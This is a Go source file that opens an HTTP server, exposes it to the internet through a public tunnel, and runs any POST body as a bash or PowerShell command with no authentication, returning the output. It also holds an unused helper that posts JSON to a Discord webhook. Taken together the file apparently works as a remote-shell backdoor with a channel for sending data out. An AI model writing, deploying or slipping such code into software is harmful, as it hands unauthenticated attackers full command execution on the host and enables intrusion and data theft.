package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"os/exec"
	"runtime"

	"github.com/kataras/tunnel"
)

func main() {
	srv := &http.Server{Addr: ":8080"}
	thingy := tunnel.MustStart(tunnel.WithServers(srv))
	go fmt.Printf("• Public Address: %s\n", thingy)
	http.HandleFunc("/", handleRequests)
	srv.ListenAndServe()
}

func handleRequests(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		w.WriteHeader(http.StatusMethodNotAllowed)
		return
	}
	body, err := ioutil.ReadAll(r.Body)
	if err != nil {
		w.WriteHeader(http.StatusInternalServerError)
		fmt.Fprintf(w, "Error reading request body: %v", err)
		return
	}
	output, err := execute(string(body))
	if err != nil {
		w.WriteHeader(http.StatusInternalServerError)
		fmt.Fprintf(w, "Error executing command: %v", err)
		return
	}

	w.WriteHeader(http.StatusOK)
	fmt.Fprintf(w, output)
}

func execute(command string) (string, error) {
	if runtime.GOOS == "windows" {
		cmd := exec.Command("powershell.exe", "-Command", command)
		cmd.Env = os.Environ()
		output, err := cmd.Output()
		if err != nil {
			return "", err
		}
		return string(output), nil
	}
	cmd := exec.Command("bash", "-c", command)
	cmd.Env = os.Environ()
	output, err := cmd.Output()
	if err != nil {
		return "", err
	}
	return string(output), nil
}

func postDiscord(webhook string, payload map[string]string) {
	jsonPayload, err := json.Marshal(payload)
	if err != nil {
		fmt.Printf("Error encoding JSON payload: %s\n", err.Error())
		return
	}

	req, err := http.NewRequest(http.MethodPost, webhook, bytes.NewBuffer(jsonPayload))
	if err != nil {
		fmt.Printf("Error creating POST request: %s\n", err.Error())
		return
	}

	req.Header.Set("Content-Type", "application/json")

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		fmt.Printf("Error sending POST request: %s\n", err.Error())
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusNoContent {
		fmt.Printf("Unexpected response status: %d\n", resp.StatusCode)
		return
	}

	return
}
